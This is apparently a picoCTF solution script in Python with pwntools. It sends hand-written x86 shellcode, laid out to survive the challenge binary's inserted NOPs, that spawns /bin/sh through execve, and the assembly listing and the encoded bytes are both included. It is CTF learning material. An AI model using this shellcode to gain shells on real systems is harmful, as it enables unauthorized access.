from pwn import *

io = process('./fun')
#io = remote('mercury.picoctf.net', 16610)

#ghidra and debug the ./fun, found that the shellcode will be inserted two nop ever two instructions...
#so we need to implement our shellcode that each keep each operation 2 instrucions (or 1+nop)

#refer to http://shell-storm.org/shellcode/files/shellcode-811.php

'''
;/bin/sh
;0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68

xor eax, eax
push eax
push eax
mov edi, esp

mov al, 0x2f
mov [edi], al
inc edi
nop

mov al, 0x62
mov [edi], al
inc edi
nop

mov al, 0x69
mov [edi], al
inc edi
nop 

mov al, 0x6e
mov [edi], al
inc edi
nop 

mov al, 0x2f
mov [edi], al
inc edi
nop 

mov al, 0x73
mov [edi], al
inc edi
nop 

mov al, 0x68
mov [edi], al
inc edi
nop 

xor edx, edx
xor ecx, ecx

mov ebx, esp
mov al, 0xb
int 0x80
nop
'''
#convert the assembly code online: https://defuse.ca/online-x86-assembler.htm#disassembly

shellcode='\x31\xC0\x50\x50\x89\xE7\xB0\x2F\x88\x07\x47\x90\xB0\x62\x88\x07\x47\x90\xB0\x69\x88\x07\x47\x90\xB0\x6E\x88\x07\x47\x90\xB0\x2F\x88\x07\x47\x90\xB0\x73\x88\x07\x47\x90\xB0\x68\x88\x07\x47\x90\x31\xD2\x31\xC9\x89\xE3\xB0\x0B\xCD\x80\x90'

io.recvuntil('Give me code to run:')
io.sendline(shellcode)

io.interactive()
